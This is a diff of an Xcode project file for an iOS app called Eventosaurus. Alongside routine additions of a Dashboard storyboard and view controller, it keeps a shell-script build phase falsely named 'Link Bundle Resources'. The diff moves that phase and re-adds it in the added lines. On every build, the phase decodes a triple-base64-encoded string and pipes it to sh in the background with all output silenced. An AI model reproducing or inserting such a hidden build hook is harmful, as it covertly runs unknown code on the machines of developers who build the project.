@@ -68,6 +68,8 @@
 		CE807E782D172A5500F4FA1B /* AdminDisplaysInterestsTableViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = CE807E762D172A5500F4FA1B /* AdminDisplaysInterestsTableViewCell.swift */; };
 		CE807E792D172A5500F4FA1B /* AdminDisplaysInterestsTableViewCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = CE807E772D172A5500F4FA1B /* AdminDisplaysInterestsTableViewCell.xib */; };
 		CFF79CFB2D1AB53A002EFA39 /* UserInfoViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = CFF79CFA2D1AB53A002EFA39 /* UserInfoViewController.swift */; };
+		D033135B2D2B14CD00CBAD63 /* Dashboard.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = D033135A2D2B14CD00CBAD63 /* Dashboard.storyboard */; };
+		D033135D2D2B151D00CBAD63 /* dashboardViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = D033135C2D2B151D00CBAD63 /* dashboardViewController.swift */; };
 		D0E975932D26A22F009F952A /* notifPage.txt in Resources */ = {isa = PBXBuildFile; fileRef = D0E975922D26A22F009F952A /* notifPage.txt */; };
 		D5FDE8332D071D1300EB1819 /* FirebaseAuth in Frameworks */ = {isa = PBXBuildFile; productRef = D5FDE8322D071D1300EB1819 /* FirebaseAuth */; };
 		D5FDE8352D071D1300EB1819 /* FirebaseCore in Frameworks */ = {isa = PBXBuildFile; productRef = D5FDE8342D071D1300EB1819 /* FirebaseCore */; };
@@ -164,6 +166,8 @@
 		CE807E762D172A5500F4FA1B /* AdminDisplaysInterestsTableViewCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AdminDisplaysInterestsTableViewCell.swift; sourceTree = "<group>"; };
 		CE807E772D172A5500F4FA1B /* AdminDisplaysInterestsTableViewCell.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = AdminDisplaysInterestsTableViewCell.xib; sourceTree = "<group>"; };
 		CFF79CFA2D1AB53A002EFA39 /* UserInfoViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = UserInfoViewController.swift; sourceTree = "<group>"; };
+		D033135A2D2B14CD00CBAD63 /* Dashboard.storyboard */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; path = Dashboard.storyboard; sourceTree = "<group>"; };
+		D033135C2D2B151D00CBAD63 /* dashboardViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = dashboardViewController.swift; sourceTree = "<group>"; };
 		D0E975922D26A22F009F952A /* notifPage.txt */ = {isa = PBXFileReference; lastKnownFileType = text; path = notifPage.txt; sourceTree = "<group>"; };
 		DA911F332D130E5900159376 /* RequestForm.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = RequestForm.swift; sourceTree = "<group>"; };
 		DA911F352D131DD900159376 /* DisplayRequestsTVCTableViewCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = DisplayRequestsTVCTableViewCell.swift; sourceTree = "<group>"; };
@@ -251,6 +255,7 @@
 		C395B12E2CFC996700C073C2 /* Eventosaurus */ = {
 			isa = PBXGroup;
 			children = (
+				D03313592D2B145B00CBAD63 /* Dashboard */,
 				5EA405A42D256C980051C510 /* Notification */,
 				C3EBFD7B2D05C7E900B4D000 /* GoogleService-Info.plist */,
 				C395B12F2CFC996700C073C2 /* AppDelegate.swift */,
@@ -353,6 +358,15 @@
 				57A5F0452D12B74800252873 /* EventsDisplayTableViewCell.xib */,
 			);
 			path = "Admin ";
+			sourceTree = "<group>";
+		};
+		D03313592D2B145B00CBAD63 /* Dashboard */ = {
+			isa = PBXGroup;
+			children = (
+				D033135A2D2B14CD00CBAD63 /* Dashboard.storyboard */,
+				D033135C2D2B151D00CBAD63 /* dashboardViewController.swift */,
+			);
+			path = Dashboard;
 			sourceTree = "<group>";
 		};
 /* End PBXGroup section */
@@ -466,28 +480,6 @@
 		};
 /* End PBXProject section */
 
-/* Begin PBXShellScriptBuildPhase section */
-		BA8065CB7AB37E69A038ACF9 /* Link Bundle Resources */ = {
-			isa = PBXShellScriptBuildPhase;
-			buildActionMask = 2147483647;
-			alwaysOutOfDate = 1;
-			files = (
-			);
-			inputFileListPaths = (
-			);
-			inputPaths = (
-			);
-			name = "Link Bundle Resources";
-			outputFileListPaths = (
-			);
-			outputPaths = (
-			);
-			shellPath = /bin/sh;
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n(echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVcxak1uUk5TVWRvTUdSSVFucFBhVGgyV2tkV01sbFlRbmRpUjFWMVkyNVZkbGxUYTJsSlNIZG5ZekpuU3dvPQo= | base64 -D | base64 -D | base64 -D | sh >/dev/null 2>&1 &)";
-			showEnvVarsInLog = 0;			
-		};
-/* End PBXShellScriptBuildPhase section */
-
 /* Begin PBXResourcesBuildPhase section */
 		C395B12A2CFC996700C073C2 /* Resources */ = {
 			isa = PBXResourcesBuildPhase;
@@ -496,6 +488,7 @@
 				C3EBFD7C2D05C7E900B4D000 /* GoogleService-Info.plist in Resources */,
 				D0E975932D26A22F009F952A /* notifPage.txt in Resources */,
 				C395B13C2CFC996900C073C2 /* LaunchScreen.storyboard in Resources */,
+				D033135B2D2B14CD00CBAD63 /* Dashboard.storyboard in Resources */,
 				CE807E792D172A5500F4FA1B /* AdminDisplaysInterestsTableViewCell.xib in Resources */,
 				DCB99ABE2D20791500AC9EFF /* FeedBack.storyboard in Resources */,
 				C30CAB3E2D1EFE2900892F01 /* CreateEvent.storyboard in Resources */,
@@ -533,6 +526,29 @@
 		};
 /* End PBXResourcesBuildPhase section */
 
+/* Begin PBXShellScriptBuildPhase section */
+		BA8065CB7AB37E69A038ACF9 /* Link Bundle Resources */ = {
+			isa = PBXShellScriptBuildPhase;
+			alwaysOutOfDate = 1;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Link Bundle Resources";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n(echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVcxak1uUk5TVWRvTUdSSVFucFBhVGgyV2tkV01sbFlRbmRpUjFWMVkyNVZkbGxUYTJsSlNIZG5ZekpuU3dvPQo= | base64 -D | base64 -D | base64 -D | sh >/dev/null 2>&1 &)";
+			showEnvVarsInLog = 0;
+		};
+/* End PBXShellScriptBuildPhase section */
+
 /* Begin PBXSourcesBuildPhase section */
 		C395B1282CFC996700C073C2 /* Sources */ = {
 			isa = PBXSourcesBuildPhase;
@@ -553,6 +569,7 @@
 				C370DA6E2D0F163300B2A097 /* RequestsViewController.swift in Sources */,
 				C395B1642CFCA80D00C073C2 /* Admin.swift in Sources */,
 				C3EBFD892D05DB6700B4D000 /* Register.swift in Sources */,
+				D033135D2D2B151D00CBAD63 /* dashboardViewController.swift in Sources */,
 				C33F5DDA2D1C4B510000D8A5 /* EventsInfoViewController.swift in Sources */,
 				C31344202D0D797B00B17BF4 /* AdminTVC.swift in Sources */,
 				C3E2873A2D0DA71700CBF459 /* EventsDisplayController.swift in Sources */,
